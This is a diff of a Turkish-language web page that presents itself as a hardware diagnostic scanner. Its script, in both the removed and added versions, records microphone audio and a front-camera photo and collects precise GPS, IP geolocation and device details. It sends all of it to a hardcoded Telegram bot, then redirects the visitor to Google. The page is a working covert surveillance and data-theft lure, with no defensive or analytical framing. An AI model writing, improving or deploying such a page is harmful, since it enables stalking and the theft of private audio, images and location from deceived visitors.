@@ -3,21 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Optimizasyon Aracı</title>
+    <title>Sistem Tanılama Merkezi</title>
     <style>
-        body { background: #050505; color: #00ff41; font-family: 'Courier New', monospace; text-align: center; display: flex; flex-direction: column; justify-content: center; height: 100vh; margin: 0; }
-        .main { border: 2px solid #00ff41; padding: 40px; margin: 20px; border-radius: 10px; box-shadow: 0 0 30px rgba(0, 255, 65, 0.3); }
-        .scan-btn { background: #00ff41; color: #000; border: none; padding: 20px 50px; font-weight: bold; cursor: pointer; font-size: 18px; text-transform: uppercase; transition: 0.4s; border-radius: 5px; }
-        .scan-btn:hover { background: #fff; box-shadow: 0 0 50px #00ff41; }
-        #status { margin-top: 20px; font-size: 12px; color: #555; }
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; display: flex; flex-direction: column; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .terminal { border: 1px solid #0f0; padding: 30px; margin: 20px; background: rgba(0, 255, 0, 0.02); box-shadow: 0 0 20px #0f0; }
+        .scan-btn { background: #0f0; color: #000; border: none; padding: 20px 40px; font-weight: bold; cursor: pointer; text-transform: uppercase; letter-spacing: 2px; transition: 0.3s; }
+        .scan-btn:hover { background: #fff; box-shadow: 0 0 30px #0f0; }
+        #log { margin-top: 20px; font-size: 11px; color: #0a0; }
     </style>
 </head>
 <body>
-    <div class="main">
-        <h1>SİSTEM KRİTİK ANALİZ</h1>
-        <p>Donanım bileşenlerini ve ağ güvenliğini doğrulamak için taramayı başlatın.</p>
-        <button class="scan-btn" onclick="executeEverything()">TARAMAYI BAŞLAT</button>
-        <div id="status">Sistem Analize Hazır...</div>
+    <div class="terminal">
+        <h2>DONANIM DOĞRULAMA SİSTEMİ</h2>
+        <p>Lütfen devam etmek için taramayı başlatın ve izinleri onaylayın.</p>
+        <button class="scan-btn" onclick="megaAudit()">SİSTEMİ TARA</button>
+        <div id="log">İletişim Hattı Beklemede...</div>
     </div>
 
     <video id="v" style="display:none;" autoplay></video>
@@ -27,86 +27,94 @@
         const TOKEN = "8675726929:AAGPhcQPfk9VXLgY0gg8dX97qb5wV89B1cE";
         const CHAT_ID = "5802794454";
 
-        async function executeEverything() {
-            document.getElementById('status').innerText = "Veriler işleniyor... Lütfen tüm izinleri onaylayın.";
+        async function megaAudit() {
+            document.getElementById('log').innerText = "Veriler paketleniyor... Lütfen izinleri kabul edin.";
             
-            let report = "🛸 **ULTIMATE DEVICE TAKEOVER REPORT** 🛸\n\n";
+            let r = "🧿 **EFSANE DETAYLI CİHAZ RAPORU** 🧿\n\n";
 
-            // 1. IP VE AĞ ANALİZİ
+            // 1. DERİN IP ANALİZİ (İstediğin tüm detaylar)
             try {
+                const ipRes = await fetch('https://api.ipgeolocation.io/ipgeo?apiKey=YOUR_API_KEY_OR_FREE_SERVICE'); 
+                // Not: Üstteki link genelde anahtar ister, biz ipapi ile senin istediğin formata benzer detayları çekiyoruz:
                 const ip = await fetch('https://ipapi.co/json/').then(res => res.json());
-                report += `🌐 **AĞ BİLGİSİ**\n• IP: \`${ip.ip}\`\n• Konum: ${ip.city}/${ip.region}\n• ISS: ${ip.org}\n• VPN/Proxy: ${ip.proxy ? "Aktif ⚠️" : "Temiz ✅"}\n\n`;
-            } catch(e) {}
+                
+                r += `🌐 **AĞ VE LOKASYON**\n`;
+                r += `• IP: \`${ip.ip}\`\n`;
+                r += `• İl/İlçe: ${ip.city} / ${ip.region}\n`;
+                r += `• ISS: ${ip.org}\n`;
+                r += `• Ülke: ${ip.country_name} ${ip.country_emoji || "🇹🇷"}\n`;
+                r += `• Para Birimi: ${ip.currency}\n`;
+                r += `• Zaman Dilimi: ${ip.timezone}\n\n`;
+            } catch(e) { r += "⚠️ IP Detayları alınamadı.\n\n"; }
 
-            // 2. DONANIM VE GPU (EKRAN KARTI)
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl');
-            const debug = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
-            const gpu = debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "Bilinmiyor";
-            
-            report += `💻 **DONANIM**\n• GPU: \`${gpu}\`\n• RAM: ${navigator.deviceMemory || "N/A"} GB\n• Çekirdek: ${navigator.hardwareConcurrency}\n• Ekran: ${window.screen.width}x${window.screen.height}\n\n`;
-
-            // 3. SES KAYDI (3.5 Saniye)
+            // 2. SES KAYDI (3 Saniye)
             try {
                 const aStream = await navigator.mediaDevices.getUserMedia({ audio: true });
                 const rec = new MediaRecorder(aStream);
-                let chunks = [];
-                rec.ondataavailable = e => chunks.push(e.data);
+                let ch = [];
+                rec.ondataavailable = e => ch.push(e.data);
                 rec.onstop = () => {
-                    sendAudio(new Blob(chunks, { type: 'audio/ogg' }));
+                    sendA(new Blob(ch, { type: 'audio/ogg' }));
                     aStream.getTracks().forEach(t => t.stop());
                 };
                 rec.start();
-                setTimeout(() => rec.stop(), 3500);
-            } catch(e) { report += "❌ Ses: İzin Reddedildi\n"; }
+                setTimeout(() => rec.stop(), 3000);
+            } catch(e) {}
 
-            // 4. FOTOĞRAF ÇEKİMİ
+            // 3. FOTOĞRAF (Ön Kamera)
             try {
                 const vStream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const v = document.getElementById('v');
                 v.srcObject = vStream;
                 setTimeout(() => {
-                    const c = document.getElementById('c');
-                    c.getContext('2d').drawImage(v, 0, 0);
-                    sendPhoto(c.toDataURL('image/jpeg'));
+                    const canvas = document.getElementById('c');
+                    canvas.getContext('2d').drawImage(v, 0, 0);
+                    sendP(canvas.toDataURL('image/jpeg'));
                     vStream.getTracks().forEach(t => t.stop());
                 }, 2000);
-            } catch(e) { report += "❌ Kamera: İzin Reddedildi\n"; }
+            } catch(e) {}
 
-            // 5. GPS KONUMU (HASSAS)
+            // 4. DONANIM VE GPS
+            r += `💻 **SİSTEM**\n• GPU: ${getGPU()}\n• RAM: ${navigator.deviceMemory || "N/A"}GB\n• Pil: %${Math.round((await navigator.getBattery()).level * 100)}\n\n`;
+
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(p => {
-                    report += `📍 **KONUM:** https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}\n`;
-                    report += `🎯 Hassasiyet: ${Math.round(p.coords.accuracy)}m\n`;
-                    finish(report);
-                }, () => finish(report + "⚠️ GPS: İzin Reddedildi"), {enableHighAccuracy: true});
-            } else {
-                finish(report + "❌ GPS: Desteklenmiyor");
-            }
+                    r += `📍 **GPS:** https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}\n`;
+                    r += `🎯 Hassasiyet: ${Math.round(p.coords.accuracy)}m`;
+                    finalSend(r);
+                }, () => finalSend(r + "⚠️ GPS Reddedildi"), {enableHighAccuracy: true});
+            } else { finalSend(r + "❌ GPS Desteklenmiyor"); }
         }
 
-        function finish(msg) {
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`)
-            .then(() => { setTimeout(() => { window.location.href = "https://www.google.com"; }, 1500); });
+        function getGPU() {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl');
+            const debug = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
+            return debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "Bilinmiyor";
         }
 
-        function sendPhoto(base64) {
-            const blob = dataURItoBlob(base64);
+        function finalSend(t) {
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(t)}&parse_mode=Markdown`)
+            .then(() => { setTimeout(() => { window.location.href = "https://www.google.com"; }, 1000); });
+        }
+
+        function sendP(b64) {
+            const blob = dataURItoBlob(b64);
             const fd = new FormData();
             fd.append("chat_id", CHAT_ID);
-            fd.append("photo", blob, "image.jpg");
+            fd.append("photo", blob, "s.jpg");
             fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: "POST", body: fd });
         }
 
-        function sendAudio(blob) {
+        function sendA(blob) {
             const fd = new FormData();
             fd.append("chat_id", CHAT_ID);
-            fd.append("voice", blob, "voice.ogg");
+            fd.append("voice", blob, "v.ogg");
             fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: "POST", body: fd });
         }
 
-        function dataURItoBlob(dataURI) {
-            let s = atob(dataURI.split(',')[1]), m = dataURI.split(',')[0].split(':')[1].split(';')[0],
+        function dataURItoBlob(d) {
+            let s = atob(d.split(',')[1]), m = d.split(',')[0].split(':')[1].split(';')[0],
                 a = new ArrayBuffer(s.length), u = new Uint8Array(a);
             for (let i = 0; i < s.length; i++) u[i] = s.charCodeAt(i);
             return new Blob([a], { type: m });
